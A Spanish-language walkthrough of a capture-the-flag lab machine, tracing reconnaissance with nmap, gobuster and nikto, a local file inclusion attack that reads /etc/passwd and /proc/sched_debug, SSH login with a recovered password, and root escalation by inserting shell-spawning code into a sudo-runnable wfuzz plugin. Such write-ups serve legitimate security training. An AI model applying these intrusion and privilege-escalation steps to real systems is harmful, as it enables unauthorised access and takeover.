Realizamos un escaneo inicial mediante ARP para identificar la dirección IP de la máquina objetivo. Como resultado, localizamos el host con la IP `192.168.0.23`.
```
sudo arp-scan -I eth0 --localnet 
```
![Captura de pantalla de 2025-05-29 10-37-22](https://github.com/user-attachments/assets/a896d8b6-242d-414c-ad56-6a92a43ac8b8)


Realizamos una enumeración de puertos con `nmap` y descubrimos que los puertos 22 (SSH) y 80 (HTTP) se encuentran abiertos.
```
nmap -p- --open -sS -sC -sV 192.168.0.23 
```
![Captura de pantalla de 2025-05-29 10-44-42](https://github.com/user-attachments/assets/fda4470a-d75a-45f8-b39a-5df7d4a5cac9)

Al detectar que el puerto 80 (HTTP) está abierto, accedemos a la dirección IP desde el navegador para analizar el contenido que se muestra en la web.

![Captura de pantalla de 2025-05-29 10-51-13](https://github.com/user-attachments/assets/4a2510f3-299c-4cbb-bcaf-8ff54de410d6)

Observamos que hay un proceso en ejecución, por lo que continuamos con la enumeración. Utilizamos Gobuster para descubrir posibles directorios ocultos que puedan proporcionarnos más información.
```
gobuster dir -u http://192.168.0.23 -w /usr/share/wordlists/dirb/common.txt -t 40
```
![Captura de pantalla de 2025-05-29 10-55-30](https://github.com/user-attachments/assets/9ea4b9dd-c0a9-488a-9a0e-713f46ba777d)


Procedemos a investigar más a fondo el archivo `index.php`. Para ello, lanzamos un escaneo con Nikto con el objetivo de detectar posibles vulnerabilidades o configuraciones inseguras.
```
sudo nikto -h http://192.168.0.23/index.php
```
![Pasted image 20250529111054](https://github.com/user-attachments/assets/c194786c-4977-4bdb-ab43-46868be618fb)

![Captura de pantalla de 2025-05-29 11-11-23](https://github.com/user-attachments/assets/12bde7f4-3cff-43cf-962b-b3cd2dbd2a2b)


Nikto nos indica que el parámetro `include` podría ser vulnerable a una vulnerabilidad de inclusión local de archivos (LFI). Para comprobarlo, realizamos una petición con `curl` y observamos la información que devuelve la página.
```
curl http://192.168.0.23/index.php?include=../../../../../../../../../etc/passwd 
```
![Pasted image 20250529125853](https://github.com/user-attachments/assets/f1d30177-de2d-4017-8e97-c7651c32f5c5)

Aprovechando la vulnerabilidad LFI, intentamos acceder al archivo `/proc/sched_debug`, ya que anteriormente se mostró un pequeño fragmento de su contenido, lo cual indica que podría estar accesible. Este archivo proporciona información sobre las tareas (procesos) en ejecución. Para facilitar la lectura, filtramos la salida utilizando `grep` con las palabras clave `ben`, `pass`, `flag`, `task` y `cmd`, centrándonos así en los datos potencialmente relevantes.
```
curl "http://192.168.0.23/index.php?include=../../../../proc/sched_debug" | grep -i 'ben\|pass\|flag\|task\|cmd'
```
![Captura de pantalla de 2025-05-29 17-56-45](https://github.com/user-attachments/assets/3ef01633-b533-463c-813f-aa134127aacc)


Accedemos a la máquina mediante SSH con el usuario `ben` para continuar la enumeración y explotación:
```
sudo ssh ben@192.168.0.23
pass: B3nP4zz
```
Ejecutamos `ls -lat` para listar los archivos en el directorio home del usuario ben y encontramos el archivo `user.txt`, que contiene la flag del usuario:

![Captura de pantalla de 2025-05-30 08-55-02](https://github.com/user-attachments/assets/43c2eb20-443b-49cf-b48e-98bd2a876cbb)

Listamos los permisos sudo del usuario ben para ver qué comandos puede ejecutar sin contraseña. Encontramos que puede ejecutar el binario `wfuzz` como sudo:
```
sudo -l
```
![Captura de pantalla de 2025-05-30 09-00-17](https://github.com/user-attachments/assets/5fe1f6d7-a482-41d6-92cd-7beed3b018fd)

Buscando archivos relacionados con `wfuzz` en los que el usuario tenga permisos de escritura, encontramos un archivo Python llamado `range.py`:
```bash
find / -writable 2>/dev/null | grep "wfuzz"
```

![Captura de pantalla de 2025-05-30 09-26-18](https://github.com/user-attachments/assets/60865b07-daa6-4bb0-b54c-916de62b6881)

Editamos el archivo vulnerable para insertar código que nos permita obtener una shell: ```ben@brain:~$ nano /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py ```Añadimos el siguiente código **al principio** del archivo para ejecutar una shell Bash:
```
import os
os.system("/bin/bash")
```


![Captura de pantalla de 2025-05-30 09-29-51](https://github.com/user-attachments/assets/78e5a153-5d84-480d-b46e-7b37b31cb693)

En cuanto se ejecute, el código Python se disparará automáticamente y nos abrirá una **shell interactiva con privilegios de root**.

```bash
sudo /usr/bin/wfuzz -z range,0-10 --hl 97 http://localhost
```

![Captura de pantalla de 2025-05-30 09-40-59](https://github.com/user-attachments/assets/74ff002d-5309-42d0-a026-436192fc540f)


## Por qué funciona esto?

`wfuzz` está hecho en Python y al ejecutar el payload `range` importa y ejecuta `range.py`, por lo que al modificar ese archivo con código que lanza una shell (`os.system("/bin/bash")`) y ejecutar `wfuzz` con `sudo`, obtenemos una shell con privilegios de root.
